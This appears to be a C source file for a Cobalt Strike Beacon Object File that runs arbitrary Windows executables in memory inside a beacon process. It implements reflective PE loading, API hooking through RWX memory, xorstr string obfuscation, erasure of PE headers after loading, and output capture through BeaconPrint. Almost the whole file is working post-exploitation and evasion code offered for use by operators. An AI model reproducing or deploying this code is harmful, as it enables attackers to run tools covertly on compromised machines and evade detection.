#ifdef _DEBUG
#define xorstr_(s) s
#else
#include "xorstr.hpp"
#endif

extern "C" {
#include "inlineexecutepe.hpp"

#include "ReflectiveLoaderEx.c"
#include "globalshareddata.c"

// TODO: Add proxy dll loading https://github.com/kleiton0x00/Proxy-DLL-Loads
_static HMODULE GetOrLoadDll(LPCSTR dllName) {
  HMODULE handle = GetModuleHandleA(dllName);
  if (handle)
    return handle;
  handle = LoadLibraryA(dllName);
  TRACEF("LoadLibraryA(%s): %p", dllName, handle);
  return handle;
}

#define GetOrLoadDll2(m) GetOrLoadDll(xorstr_(m))
#define GetProcAddress2(m, f) ((PVOID)GetProcAddress(m, xorstr_(f)))

#include "jobs.c"
#include "seh.c"

_static void ImportHookApis(HookContext *ctx) {
  // clang-format off
  HMODULE kernel32                        = GetOrLoadDll2("kernel32.dll");
  ctx->_AddVectoredContinueHandler        = GetProcAddress2(kernel32, "AddVectoredContinueHandler");
  ctx->_AddVectoredExceptionHandler       = GetProcAddress2(kernel32, "AddVectoredExceptionHandler");
  ctx->_CloseHandle                       = GetProcAddress2(kernel32, "CloseHandle");
  ctx->_CreateEventA                      = GetProcAddress2(kernel32, "CreateEventA");
  ctx->_CreatePipe                        = GetProcAddress2(kernel32, "CreatePipe");
  ctx->_CreateThread                      = GetProcAddress2(kernel32, "CreateThread");
  ctx->_ExitThread                        = GetProcAddress2(kernel32, "ExitThread");
  ctx->_GetModuleHandleA                  = GetProcAddress2(kernel32, "GetModuleHandleA");
  ctx->_GetProcAddress                    = GetProcAddress2(kernel32, "GetProcAddress");
  ctx->_GetStdHandle                      = GetProcAddress2(kernel32, "GetStdHandle");
  ctx->_GetThreadId                       = GetProcAddress2(kernel32, "GetThreadId");
  ctx->_MultiByteToWideChar               = GetProcAddress2(kernel32, "MultiByteToWideChar");
  ctx->_OpenThread                        = GetProcAddress2(kernel32, "OpenThread");
  ctx->_Process32NextW                    = GetProcAddress2(kernel32, "Process32NextW");
  ctx->_ReadFile                          = GetProcAddress2(kernel32, "ReadFile");
  ctx->_RemoveVectoredContinueHandler     = GetProcAddress2(kernel32, "RemoveVectoredContinueHandler");
  ctx->_RemoveVectoredExceptionHandler    = GetProcAddress2(kernel32, "RemoveVectoredExceptionHandler");
  ctx->_SetEvent                          = GetProcAddress2(kernel32, "SetEvent");
  ctx->_SetUnhandledExceptionFilter       = GetProcAddress2(kernel32, "SetUnhandledExceptionFilter");
  ctx->_Sleep                             = GetProcAddress2(kernel32, "Sleep");
  ctx->_TerminateThread                   = GetProcAddress2(kernel32, "TerminateThread");
  ctx->_TlsAlloc                          = GetProcAddress2(kernel32, "TlsAlloc");
  ctx->_TlsFree                           = GetProcAddress2(kernel32, "TlsFree");
  ctx->_VirtualAlloc                      = GetProcAddress2(kernel32, "VirtualAlloc");
  ctx->_VirtualFree                       = GetProcAddress2(kernel32, "VirtualFree");
  ctx->_WaitForSingleObject               = GetProcAddress2(kernel32, "WaitForSingleObject");
  ctx->_WideCharToMultiByte               = GetProcAddress2(kernel32, "WideCharToMultiByte");
  ctx->_WriteFile                         = GetProcAddress2(kernel32, "WriteFile");
  HMODULE msvcrt                          = GetOrLoadDll2("msvcrt.dll");
  ctx->__vscprintf                        = GetProcAddress2(msvcrt, "_vscprintf");
  ctx->_free                              = GetProcAddress2(msvcrt, "free");
  ctx->_malloc                            = GetProcAddress2(msvcrt, "malloc");
  ctx->_realloc                           = GetProcAddress2(msvcrt, "realloc");
  ctx->_vsprintf_s                        = GetProcAddress2(msvcrt, "vsprintf_s");
#ifdef _DEBUG
  ctx->_OutputDebugStringA                = GetProcAddress2(kernel32, "OutputDebugStringA");
#endif
#ifndef BOF
  ctx->_free                              = (PVOID)free;
  ctx->_malloc                            = (PVOID)malloc;
  ctx->_realloc                           = (PVOID)realloc;
#endif
  // clang-format on
  PVOID *apis = &ctx->_AddVectoredContinueHandler;
  int apiCount = (int)(&ctx->MyGetProcAddress - apis);
  for (int i = 0; i < apiCount; i++) {
    TRACEF("Api[%d]: %p", i, apis[i]);
    if (!apis[i])
      PRINTF_ERR("Api[%d] is NULL.", i);
  }
}

HookResult InlineExecutePE(HookFeatures features, bool isBackground,
                           int runningTimeoutMs, void *stdin_, int stdinSize,
                           void *peImage, int peImageSize, char *commandLineA,
                           int commandLineASize, void **loadedImageBase,
                           int jobVersion) {
  TRACEF("Begin run pe.");

  HookContext *hookCtx = NULL;
  HookControlEntryProc hookControlEntry = NULL;
  WCHAR *commandLineW = NULL;
  int commandLineWSize = 0;
  JobEntry **jobList = NULL;
  int jobId = -1;
  HANDLE hJobWritePipe = NULL;
  HookResult result = HookResultSuccess;
  DWORD imageSize = 0;
  PVOID imageBase = NULL;
  PVOID entryPoint = NULL;
  GlobalSharedData *sharedData = NULL;
  int index = 0;
  int outputType = 0;
  SimpleList *stdout_ = NULL;
  SimpleList *stderr_ = NULL;

  // Check the architecture of the PE image
  if (((PIMAGE_NT_HEADERS)((PBYTE)peImage +
                           ((PIMAGE_DOS_HEADER)peImage)->e_lfanew))
          ->FileHeader.Machine != (sizeof(PVOID) == 4
                                       ? IMAGE_FILE_MACHINE_I386
                                       : IMAGE_FILE_MACHINE_AMD64)) {
    PRINTF_ERR("The architecture of the PE image to be loaded does not match "
               "the current process.");
    result = HookResultErrorInvalidArgument;
    goto err;
  }

  /*
   * 1. Prepare hook
   */

  TRACEF("1. Prepare hook");

  hookCtx = (HookContext *)malloc(sizeof(HookContext));
  if (!hookCtx) {
    PRINTF_ERR("Failed to allocate hooks context.");
    goto err;
  }
  _memset(hookCtx, 0, sizeof(HookContext));
  hookCtx->Features = features;
  ImportHookApis(hookCtx);
#ifdef HOOKS_DLL
  hookControlEntry = (HookControlEntryProc)GetProcAddress2(
      GetOrLoadDll2("hooks.dll"), "__HookControlEntry");
#else
  hookControlEntry = (HookControlEntryProc)VirtualAlloc(
      NULL, sizeof(HOOKS_EXE), MEM_RESERVE | MEM_COMMIT,
      PAGE_EXECUTE_READWRITE);
  // TODO: allocate then set RWX, add padding before and after code.
  if (!hookControlEntry) {
    PRINTF_ERR("Failed to allocate hooks code.");
    goto err;
  }
  _memcpy((void *)hookControlEntry, HOOKS_EXE, sizeof(HOOKS_EXE));
#endif
  hookCtx->HookControlEntry = (PVOID)hookControlEntry;
  if ((hookCtx->Features & HookFeatureCommandLine) && commandLineA) {
    commandLineWSize = commandLineASize * 2;
    commandLineW = (WCHAR *)malloc(commandLineWSize);
    if (!commandLineW ||
        !toWideChar(commandLineA, commandLineW, commandLineWSize)) {
      PRINTF_ERR("Failed to allocate commandLineW.");
      goto err;
    }
    commandLineWSize = 0;
    while (commandLineW[commandLineWSize++] != L'\0')
      ;
    commandLineWSize *= 2;
  } else {
    commandLineWSize = 0;
    commandLineW = NULL;
  }

  /*
   * 2. Initialize hook
   */

  TRACEF("2. Initialize hook");

  if (SimpleAddJob(jobVersion,
                   (hookCtx->Features & HookFeatureCpp) ? CALLBACK_OUTPUT
                                                        : CALLBACK_OUTPUT_UTF8,
                   commandLineA, &jobList, &jobId, &hJobWritePipe))
    PRINTF("Job %d was added. Never use 'jobkill' or 'inline-log-pe' for this "
           "PE image!",
           jobId);

  result = hookControlEntry(HookControlCreate, hookCtx, stdin_, stdinSize,
                            commandLineA, commandLineASize, commandLineW,
                            commandLineWSize, hJobWritePipe);
  switch (result) {
  case HookResultSuccess:
    break;
  case HookResultErrorCreateLogs:
    PRINTF_ERR("Failed to create hook log queue.");
    goto err;
  case HookResultErrorCreateProcessExitedEvent:
    PRINTF_ERR("Failed to create process exited event.");
    goto err;
  case HookResultErrorCreateCommandLine:
    PRINTF_ERR("Failed to allocate command-line.");
    goto err;
  case HookResultErrorCreatePipeServers:
    PRINTF_ERR("Failed to create pipe servers to redirect stdio.");
    goto err;
  case HookResultErrorCreateNewThreadList:
    PRINTF_ERR("Failed to allocate new thread list.");
    goto err;
  case HookResultErrorCreateExceptionHandlerList:
    PRINTF_ERR("Failed to allocate exception handler list.");
    goto err;
  case HookResultErrorCreateMemoryList:
    PRINTF_ERR("Failed to allocate memory list.");
    goto err;
  case HookResultErrorCreateTlsList:
    PRINTF_ERR("Failed to allocate tls list.");
    goto err;
  case HookResultErrorCreateKernel32Base:
    PRINTF_ERR("Failed to get kernel32.dll image base.");
    goto err;
  default:
    PRINTF_ERR("Failed to call HookControlEntry(HookControlCreate): %x",
               result);
    goto err;
  }

  /*
   * 3. Load PE image from memory
   */

  TRACEF("3. Load PE image from memory");

  imageSize = ((PIMAGE_NT_HEADERS)((PBYTE)peImage +
                                   ((PIMAGE_DOS_HEADER)peImage)->e_lfanew))
                  ->OptionalHeader.SizeOfImage;
  imageBase = peImage;
  entryPoint = ReflectiveLoaderEx(
      &imageBase, (PVOID)LoadLibraryA, hookCtx->MyGetProcAddress,
      (PVOID)VirtualAlloc, (PVOID)NtFlushInstructionCache,
      hookCtx->Features & HookFeatureCppSEH);
  TRACEF("ReflectiveLoaderEx done.");
  if (hookCtx->Features & HookFeatureCppSEH) {
    EnableSEH(imageBase);
    TRACEF("SEH was enabled.");
    // Zero PE headers
    _memset(peImage, 0,
            ((PIMAGE_NT_HEADERS)((PBYTE)peImage +
                                 ((PIMAGE_DOS_HEADER)peImage)->e_lfanew))
                ->OptionalHeader.SizeOfHeaders);
  }
  if (loadedImageBase)
    *loadedImageBase = imageBase;
  PRINTF("PE image was loaded. (imageBase: %p, imageSize: %x, entryPoint: %p)",
         imageBase, (UINT)imageSize, entryPoint);

  /*
   * 4. Call exe entrypoint
   */

  TRACEF("4. Call exe entrypoint");

  result = hookControlEntry(HookControlStart, entryPoint);
  switch (result) {
  case HookResultSuccess:
    break;
  case HookResultErrorStartNewThread:
    PRINTF_ERR("Failed to create new thread to run exe entry-point.");
    goto err;
  default:
    PRINTF_ERR("Failed to call HookControlEntry(HookControlCreate): %x",
               result);
    goto err;
  }
  TRACEF("Thread of exe entry-point was created.");
  sharedData = GetGlobalSharedData();
  for (index = 0; index < LoadedPEImageMax; index++) {
    if (!sharedData->PEImages[index].ImageBase)
      break;
  }
  if (index == LoadedPEImageMax) {
    PRINTF_ERR("Too many loaded PE images. Can't add to PEImages.");
    goto out;
  }
  sharedData->PEImages[index].ImageBase = imageBase;
  sharedData->PEImages[index].HookContext = hookCtx;
  sharedData->PEImages[index].IsRunning = TRUE;
  sharedData->PEImages[index].JobList = jobList;
  sharedData->PEImages[index].JobId = jobId;
  sharedData->LastImageBase = imageBase;
  TRACEF("PE Image %p was added to global shared data index %d.", imageBase,
         index);
  // We must use background mode when the PE image was added to the job list.
  // Otherwise, the log in the hooks will lost due to the job will be removed
  // before return.
  if (isBackground || jobList) {
    PRINTF("Skip waiting and run PE in the background.");
    goto out;
  }

  /*
   * 5. Wait for the entry point complete
   */

  TRACEF("5. Wait for the entry point complete");

  result = hookControlEntry(HookControlStop, runningTimeoutMs);
  // DO NOT goto err if failed since here. We don't know if PE image really ran
  // competed.
  switch (result) {
  case HookResultSuccess:
    break;
  case HookResultErrorStopWaitTimeout:
    PRINTF_ERR("Timeout waiting for exe entry-point to finish running.");
    goto out;
  case HookResultErrorStopWaitLastThread:
    PRINTF_ERR("Failed to wait for the last thread to exit.");
    goto out;
  default:
    PRINTF_ERR("Failed to call HookControlEntry(HookControlStop): %x", result);
    goto out;
  }
  TRACEF("WaitForSingleObject(ProcessExitedEvent) returns.");

  /*
   * 6. Print async log (excluding stdout/stderr)
   */

  TRACEF("6. Print async log (excluding stdout/stderr)");

  if (!jobList) {
    SpinLock(hookCtx->LogLock, {
      SimpleListForEach(&hookCtx->Logs, LogEntry, log, {
        if (log->Text) {
          _BeaconPrint(log->Type, xorstr_("%.*s"), log->Size, log->Text);
          free(log->Text);
          log->Text = NULL;
          // TODO: Trim list?
        }
      });
    });
  }

  /*
   * 7. Print stdout/stderr
   */

  TRACEF("7. Print stdout/stderr");

  if (hookCtx->Features & HookFeatureRedirectStdio) {
    outputType = (hookCtx->Features & HookFeatureCpp) ? CALLBACK_OUTPUT
                                                      : CALLBACK_OUTPUT_UTF8;
    stdout_ = &hookCtx->StdoutPipe.Buffer;
    _BeaconPrint(outputType, xorstr_("Stdout: %.*s"), stdout_->Size,
                 (char *)stdout_->Buffer);
    stderr_ = &hookCtx->StderrPipe.Buffer;
    _BeaconPrint(outputType, xorstr_("Stderr: %.*s"), stderr_->Size,
                 (char *)stderr_->Buffer);
  }

  /*
   * 8. Free hook and PE image
   */

  TRACEF("8. Free hook and PE image");

  hookControlEntry(HookControlDelete);
  if (hookCtx->Features & HookFeatureUnload) {
    if (hookCtx->Features & HookFeatureCppSEH) {
      DisableSEH(imageBase);
      TRACEF("SEH was disabled.");
    }
    VirtualFree(imageBase, 0, MEM_RELEASE);
    TRACEF("The entire PE image was unloaded.");
    if (jobList) {
      SimpleRemoveJob(jobList, jobId);
      TRACEF("Job %d was removed.", jobId);
    }
#ifndef HOOKS_DLL
    VirtualFree((PVOID)hookControlEntry, 0, MEM_RELEASE);
    TRACEF("The hook code was unloaded.");
#endif
    free(hookCtx);
    TRACEF("The hook context was free.");
    sharedData->PEImages[index].ImageBase = NULL;
    sharedData->PEImages[index].HookContext = NULL;
    sharedData->PEImages[index].IsRunning = FALSE;
    sharedData->PEImages[index].JobList = NULL;
    sharedData->PEImages[index].JobId = 0;
    TRACEF("PE Image %p was removed from global shared data index %d.",
           imageBase, index);
  }
  PRINTF("The exe run completed.");
  goto out;

err:
  if (imageBase)
    VirtualFree(imageBase, 0, MEM_RELEASE);
  if (jobList)
    SimpleRemoveJob(jobList, jobId);
#ifndef HOOKS_DLL
  if (hookControlEntry)
    VirtualFree((PVOID)hookControlEntry, 0, MEM_RELEASE);
#endif
  if (hookCtx)
    free(hookCtx);
out:
  if (commandLineW)
    free(commandLineW);

  TRACEF("End run pe.");

  return result;
}

#ifdef BOF
void go(char *argv, int argc) {
  // Parse arguments
  datap parser;
  BeaconDataParse(&parser, argv, argc);
  HookFeatures features = (HookFeatures)BeaconDataInt(&parser);
  bool isBackground = !!(BOOL)BeaconDataInt(&parser);
  int runningTimeoutMs = BeaconDataInt(&parser);
  int stdinSize = 0;
  void *stdin_ = BeaconDataExtract(&parser, &stdinSize);
  int peImageSize = 0;
  void *peImage = BeaconDataExtract(&parser, &peImageSize);
  int commandLineASize = 0;
  char *commandLineA = BeaconDataExtract(&parser, &commandLineASize);
  int jobVersion = BeaconDataInt(&parser);
  TRACEF("Arguments was parsed. (features: %x, isBackground: %d, "
         "runningTimeoutMs: %d, stdin_: %p, stdinSize: %d, peImage: %p, "
         "peImageSize: %d, commandLineA: %s, jobVersion: %d)",
         features, isBackground, runningTimeoutMs, stdin_, stdinSize, peImage,
         peImageSize, commandLineA, jobVersion);

  void *loadedImageBase = NULL;
  InlineExecutePE(features, isBackground, runningTimeoutMs, stdin_, stdinSize,
                  peImage, peImageSize, commandLineA, commandLineASize,
                  &loadedImageBase, jobVersion);
}
#endif
}
